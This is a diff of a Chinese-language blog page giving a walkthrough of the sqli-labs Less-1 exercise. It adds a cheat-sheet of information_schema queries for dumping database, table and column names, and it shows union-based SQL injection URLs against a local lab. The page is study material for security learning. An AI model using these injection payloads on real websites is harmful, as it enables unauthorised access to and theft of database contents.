@@ -458,7 +458,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-25
+                    2020-11-26
                 </div>
                 
 
@@ -482,7 +482,20 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="注-由于为了更方便学习-我在网页源码后面把sql语句输出出来了方便学习-实际学习的时候是要看报错自己推里的"><a href="#注-由于为了更方便学习-我在网页源码后面把sql语句输出出来了方便学习-实际学习的时候是要看报错自己推里的" class="headerlink" title="注:由于为了更方便学习,我在网页源码后面把sql语句输出出来了方便学习,实际学习的时候是要看报错自己推里的"></a>注:由于为了更方便学习,我在网页源码后面把sql语句输出出来了方便学习,实际学习的时候是要看报错自己推里的</h1><h2 id="一-less1-——-字符注入-单引号闭合"><a href="#一-less1-——-字符注入-单引号闭合" class="headerlink" title="一.less1 —— 字符注入(单引号闭合)"></a>一.less1 —— 字符注入(单引号闭合)</h2><p><a href="https://imgchr.com/i/DMFAP0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/DMFAP0.png" alt=""></a></p>
+                <p><strong>注:由于为了更方便学习,我在网页源码后面把sql语句输出出来了方便学习,实际学习的时候是要看报错自己推理测试的</strong></p>
+<p>爆数据库常用的代码集合</p>
+<pre class=" language-sql"><code class="language-sql"><span class="token comment" spellcheck="true">#爆所有数据库名</span>
+<span class="token keyword">select</span> GROUP_CONCAT<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token keyword">FROM</span> information_schema<span class="token punctuation">.</span>schemata
+
+<span class="token comment" spellcheck="true">#爆某数据库所有表名</span>
+<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">"数据库名"</span> 
+
+<span class="token comment" spellcheck="true">#爆所有列名</span>
+<span class="token keyword">select</span> group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">"表名"</span> 
+
+<span class="token comment" spellcheck="true">#爆某一列的所有数据</span>
+<span class="token keyword">SELECT</span> GROUP_CONCAT<span class="token punctuation">(</span>列名<span class="token punctuation">)</span> <span class="token keyword">FROM</span> 表名</code></pre>
+<h2 id="一-less1-——-字符注入-单引号闭合"><a href="#一-less1-——-字符注入-单引号闭合" class="headerlink" title="一.less1 —— 字符注入(单引号闭合)"></a>一.less1 —— 字符注入(单引号闭合)</h2><p><a href="https://imgchr.com/i/DMFAP0" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/19/DMFAP0.png" alt=""></a></p>
 <h3 id="1-首先判断注入的类型"><a href="#1-首先判断注入的类型" class="headerlink" title="1.首先判断注入的类型:"></a>1.首先判断注入的类型:</h3><p>方法：先在后面加一个单引号 ‘  测试一下(注意别用中文单引号)</p>
 <pre><code>127.0.0.1/sqli-labs/Less-1/?id=1'</code></pre><p>会出现报错,报错内容如下(报错说明程序员未对输入内容进行过滤)</p>
 <pre><code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1</code></pre><p>可以猜它的sql语句如下</p>
@@ -508,7 +521,7 @@
 <h4 id="进行敏感操作-1-4关都这样-主要在第一关详细讲"><a href="#进行敏感操作-1-4关都这样-主要在第一关详细讲" class="headerlink" title="进行敏感操作(1-4关都这样,主要在第一关详细讲)"></a>进行敏感操作(1-4关都这样,主要在第一关详细讲)</h4><p>当我们对数据回显位置有了了解之后,就可以在联合查询语句中进行查询敏感信息了<br>1.比如得到所有数据库的名字<br>注1:因为知道了参数对应的回显位置,所以下面让password的位置回显数据<br>注2:利用group_concat(字段名)来吧需要的字段的数据聚合到一个组然后输出</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1' 
 union select 1,2,GROUP_CONCAT(schema_name)FROM information_schema.schemata--+</code></pre><p><a href="https://imgchr.com/i/DMGl8O" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DMGl8O.png" alt="结果图"></a></p>
-<p>2.爆security数据库的数据表</p>
+<p>2.爆security数据库的所有表名</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema="security" --+</code></pre><p><a href="https://imgchr.com/i/DQJ8C6" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQJ8C6.png" alt="结果图"></a></p>
 <p>3.爆users表的列</p>
 <pre><code>http://127.0.0.1/sqli-labs/Less-1/?id=-1'union select 1,2,group_concat(column_name) from information_schema.columns where table_name="users" --+</code></pre><p><a href="https://imgchr.com/i/DQYfyD" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/20/DQYfyD.png" alt="结果图"></a></p>
@@ -739,8 +752,8 @@ SELECT * FROM `users` WHERE id=("1");#双引号加括号</code></pre><p>步骤�
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            主要记录mysql注入天书中Background中的知识
-一.Background-1基础知识https://www.cnblogs.com/csnd/p/11807596.html这里记录了一些敏感操作的注入方法mysql里的一些函数: 
+                            字符进制转换的网站:https://www.bejson.com/convert/ox2str/网址加密解密网站http://www.guabu.com/tools/wyjm.htm
+主要记录mysql注入天书中Background中的知识
                         
                     </div>
                     <div class="publish-info">
